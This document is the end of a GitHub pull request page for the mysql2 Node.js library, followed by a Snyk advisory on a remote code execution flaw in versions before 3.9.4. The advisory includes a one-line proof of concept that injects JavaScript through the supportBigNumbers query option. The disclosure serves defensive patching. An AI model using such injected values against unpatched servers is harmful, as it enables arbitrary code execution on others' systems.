-   revert breaking change in results creation ([#&#8203;2591]([sidorares/node-mysql2#2591](https://github.com/sidorares/node-mysql2/pull/2591))) ([f7c60d0]([sidorares/node-mysql2@f7c60d0](https://github.com/sidorares/node-mysql2/commit/f7c60d01a49666130f51d3847ccfdd3d6e3d33e9)))

### [`v3.9.4`](<https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#394-2024-04-09>)

[Compare Source]([sidorares/node-mysql2@v3.9.3...v3.9.4](https://github.com/sidorares/node-mysql2/compare/v3.9.3...v3.9.4))

##### Bug Fixes

-   **docs:** improve the contribution guidelines ([#&#8203;2552]([sidorares/node-mysql2#2552](https://github.com/sidorares/node-mysql2/pull/2552))) ([8a818ce]([sidorares/node-mysql2@8a818ce](https://github.com/sidorares/node-mysql2/commit/8a818ce0f30654eba854759e6409c0ac856fc448)))
-   **security:** improve results object creation ([#&#8203;2574]([sidorares/node-mysql2#2574](https://github.com/sidorares/node-mysql2/pull/2574))) ([4a964a3]([sidorares/node-mysql2@4a964a3](https://github.com/sidorares/node-mysql2/commit/4a964a3910a4b8de008696c554ab1b492e9b4691)))
-   **security:** improve supportBigNumbers and bigNumberStrings sanitization ([#&#8203;2572]([sidorares/node-mysql2#2572](https://github.com/sidorares/node-mysql2/pull/2572))) ([74abf9e]([sidorares/node-mysql2@74abf9e](https://github.com/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805)))

</details>

---

### Configuration

üìÖ **Schedule**: Branch creation - At any time (no schedule defined), Automerge - At any time (no schedule defined).

üö¶ **Automerge**: Disabled by config. Please merge this manually once you are satisfied.

‚ôª **Rebasing**: Whenever PR becomes conflicted, or you tick the rebase/retry checkbox.

üîï **Ignore**: Close this PR and you won't be reminded about this update again.

---

 - [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check this box

---

This PR has been generated by [Renovate Bot](<https://github.com/renovatebot/renovate>).
<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiIzNy4wLjAiLCJ1cGRhdGVkSW5WZXIiOiIzNy4wLjAiLCJ0YXJnZXRCcmFuY2giOiJkZXZlbG9wIn0=-->

Reviewed-on: <https://git.vylpes.xyz/RabbitLabs/Droplet/pulls/304>
Co-authored-by: Renovate Bot <renovate@vylpes.com>
Co-committed-by: Renovate Bot <renovate@vylpes.com>
```

[![@q1blue](https://avatars.githubusercontent.com/u/105375894?s=40&v=4)](/q1blue)
[q1blue](/q1blue)
mentioned this pull request
[May 29, 2024](#ref-pullrequest-2322231650)

[[Snyk] Upgrade mysql2 from 2.3.3 to 3.9.7
https-quantumblockchainai-atlassian-net/ossinsight#734](/https-quantumblockchainai-atlassian-net/ossinsight/pull/734)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[May 29, 2024](#ref-pullrequest-2324227361)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#452](/TheLastArchive/wrapped-for-discord/pull/452)
 Open

[![@hatifmujahid](https://avatars.githubusercontent.com/u/56687118?s=40&v=4)](/hatifmujahid)
[hatifmujahid](/hatifmujahid)
mentioned this pull request
[May 30, 2024](#ref-pullrequest-2326262056)

[[Snyk] Upgrade mysql2 from 3.9.2 to 3.9.7
hatifmujahid/devdayserver#10](/hatifmujahid/devdayserver/pull/10)
 Merged

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[May 31, 2024](#ref-pullrequest-2327025903)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#456](/TheLastArchive/wrapped-for-discord/pull/456)
 Open

[![@QuiqueCode](https://avatars.githubusercontent.com/u/149546547?s=40&v=4)](/QuiqueCode)
[QuiqueCode](/QuiqueCode)
mentioned this pull request
[May 31, 2024](#ref-pullrequest-2328667545)

[[Snyk] Upgrade mysql2 from 3.7.0 to 3.9.7
QuiqueCode/SNYK-EXAMPLE#2](/QuiqueCode/SNYK-EXAMPLE/pull/2)
 Open

149 hidden items

Load more‚Ä¶

This was referenced Aug 4, 2024

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.2
TheLastArchive/wrapped-for-discord#700](/TheLastArchive/wrapped-for-discord/pull/700)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.2
TheLastArchive/wrapped-for-discord#704](/TheLastArchive/wrapped-for-discord/pull/704)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 5, 2024](#ref-pullrequest-2447822172)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.2
PugChungus/FYP-AAT#252](/PugChungus/FYP-AAT/pull/252)
 Open

This was referenced Aug 6, 2024

[[Snyk] Upgrade mysql2 from 3.6.0 to 3.10.3
jvvillanueva9104/CI-CD-Backend-Project#64](/jvvillanueva9104/CI-CD-Backend-Project/pull/64)
 Open

[[Snyk] Upgrade mysql2 from 3.6.0 to 3.10.3
HelenaMission/DevOps-CICD-For-Car-Insurance-Quote-App#36](/HelenaMission/DevOps-CICD-For-Car-Insurance-Quote-App/pull/36)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 6, 2024](#ref-pullrequest-2450131125)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#257](/PugChungus/FYP-AAT/pull/257)
 Open

[![@nvmitsme](https://avatars.githubusercontent.com/u/60306467?s=40&v=4)](/nvmitsme)
[nvmitsme](/nvmitsme)
mentioned this pull request
[Aug 6, 2024](#ref-pullrequest-2450259742)

[[Snyk] Upgrade mysql2 from 3.2.3 to 3.10.3
nvmitsme/labman\_backend#36](/nvmitsme/labman_backend/pull/36)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 6, 2024](#ref-pullrequest-2450381817)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#708](/TheLastArchive/wrapped-for-discord/pull/708)
 Open

[![@claude-morningstar47](https://avatars.githubusercontent.com/u/88271937?s=40&v=4)](/claude-morningstar47)
[claude-morningstar47](/claude-morningstar47)
mentioned this pull request
[Aug 6, 2024](#ref-pullrequest-2451166740)

[[Snyk] Upgrade mysql2 from 3.2.0 to 3.10.3
claude-morningstar47/book-api#111](/claude-morningstar47/book-api/pull/111)
 Open

[![@q1blue](https://avatars.githubusercontent.com/u/105375894?s=40&v=4)](/q1blue)
[q1blue](/q1blue)
mentioned this pull request
[Aug 6, 2024](#ref-pullrequest-2451494154)

[[Snyk] Upgrade mysql2 from 2.3.3 to 3.10.3
https-quantumblockchainai-atlassian-net/ossinsight#797](/https-quantumblockchainai-atlassian-net/ossinsight/pull/797)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 7, 2024](#ref-pullrequest-2452497135)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#262](/PugChungus/FYP-AAT/pull/262)
 Open

[![@DevexHub121](https://avatars.githubusercontent.com/u/130027864?s=40&v=4)](/DevexHub121)
[DevexHub121](/DevexHub121)
mentioned this pull request
[Aug 7, 2024](#ref-pullrequest-2452909525)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
DevexHub121/expense-app-api#1](/DevexHub121/expense-app-api/pull/1)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 7, 2024](#ref-pullrequest-2453126806)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#712](/TheLastArchive/wrapped-for-discord/pull/712)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 8, 2024](#ref-pullrequest-2454866914)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#267](/PugChungus/FYP-AAT/pull/267)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 8, 2024](#ref-pullrequest-2455346261)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#716](/TheLastArchive/wrapped-for-discord/pull/716)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 9, 2024](#ref-pullrequest-2457450069)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#272](/PugChungus/FYP-AAT/pull/272)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 9, 2024](#ref-pullrequest-2457763699)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#720](/TheLastArchive/wrapped-for-discord/pull/720)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 10, 2024](#ref-pullrequest-2458935685)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#277](/PugChungus/FYP-AAT/pull/277)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 10, 2024](#ref-pullrequest-2458988459)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#724](/TheLastArchive/wrapped-for-discord/pull/724)
 Open

[![@PugChungus](https://avatars.githubusercontent.com/u/92773637?s=40&v=4)](/PugChungus)
[PugChungus](/PugChungus)
mentioned this pull request
[Aug 11, 2024](#ref-pullrequest-2459452047)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#282](/PugChungus/FYP-AAT/pull/282)
 Open

[![@AngieINC2024](https://avatars.githubusercontent.com/u/167156620?s=40&v=4)](/AngieINC2024)
[AngieINC2024](/AngieINC2024)
mentioned this pull request
[Aug 11, 2024](#ref-pullrequest-2459461977)

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
AngieINC2024/bed-ca2-Liwenhannnie-main#1](/AngieINC2024/bed-ca2-Liwenhannnie-main/pull/1)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 11, 2024](#ref-pullrequest-2459505098)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#728](/TheLastArchive/wrapped-for-discord/pull/728)
 Open

[![@Sajid-Ali](https://avatars.githubusercontent.com/u/20899703?s=40&v=4)](/Sajid-Ali)
[Sajid-Ali](/Sajid-Ali)
mentioned this pull request
[Aug 11, 2024](#ref-pullrequest-2459523505)

[[Snyk] Upgrade mysql2 from 3.3.4 to 3.10.3
Sajid-Ali/gandum-muhafiz-be#1](/Sajid-Ali/gandum-muhafiz-be/pull/1)
 Open

[![@TheLastArchive](https://avatars.githubusercontent.com/u/60932770?s=40&v=4)](/TheLastArchive)
[TheLastArchive](/TheLastArchive)
mentioned this pull request
[Aug 12, 2024](#ref-pullrequest-2460114281)

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#732](/TheLastArchive/wrapped-for-discord/pull/732)
 Open

This was referenced Aug 12, 2024

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#287](/PugChungus/FYP-AAT/pull/287)
 Open

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#292](/PugChungus/FYP-AAT/pull/292)
 Open

This was referenced Aug 13, 2024

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#736](/TheLastArchive/wrapped-for-discord/pull/736)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.10.3
TheLastArchive/wrapped-for-discord#740](/TheLastArchive/wrapped-for-discord/pull/740)
 Open

This was referenced Aug 15, 2024

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#297](/PugChungus/FYP-AAT/pull/297)
 Open

[[Snyk] Upgrade mysql2 from 3.6.5 to 3.10.3
PugChungus/FYP-AAT#302](/PugChungus/FYP-AAT/pull/302)
 Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fpull%2F2572)

Reviewers

No reviews

Assignees

No one assigned

Labels

[enhancement](/sidorares/node-mysql2/labels/enhancement)
[security](/sidorares/node-mysql2/labels/security)

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

1 participant

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=52&v=4)](/wellwelwel)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from security.snyk.io_6c17a155_20250111_190416.html ===
[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)

2. [Snyk Vulnerability Database](/vuln)
3. [npm](/vuln/npm)
4. mysql2
# Remote Code Execution (RCE) Affecting [mysql2](/package/npm/mysql2) package, versions **<3.9.4**

---

### Severity

 Recommended 0.0critical010

CVSS assessment made by Snyk's Security Team. [Learn more](/vuln/SNYK-JS-MYSQL2-6591085#cvss)

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)
for more details.

**0.04% (13th percentile)**
### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)

* Snyk ID**SNYK-JS-MYSQL2-6591085**
* published**10 Apr 2024**
* disclosed**7 Apr 2024**
* credit**Vsevolod Kokorin**

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
#### Introduced: 7 Apr 2024

[CVE-2024-21508 ¬†(opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21508) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-94 ¬†(opens in a new tab)](https://cwe.mitre.org/data/definitions/94.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `mysql2` to version 3.9.4 or higher.

## Overview

[mysql2](https://www.npmjs.com/package/mysql2) is a mostly API compatible with mysqljs and supports majority of features.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) via the `readCodeFor` function due to improper validation of the `supportBigNumbers` and `bigNumberStrings` values.

## PoC

```
 {sql:`SELECT INDEX_LENGTH FROM information_schema.tables LIMIT 1`, supportBigNumbers:"console.log(1337)"}

```
## References

* [GitHub Commit](https://github.com/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805)
* [GitHub PR](https://github.com/sidorares/node-mysql2/pull/2572)
* [GitHub Release](https://github.com/sidorares/node-mysql2/releases/tag/v3.9.4)
* [Security Blog](https://blog.slonser.info/posts/mysql2-attacker-configuration/)
* [Vulnerable Code](https://github.com/sidorares/node-mysql2/blob/1609b5393516d72a4ae47196837317fbe75e0c13/lib/parsers/text_parser.js#L14C10-L14C21)
### CVSS Scores

version 3.1
### Snyk

9.8¬†critical

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed ‚Äúremotely exploitable‚Äù and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

¬© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.


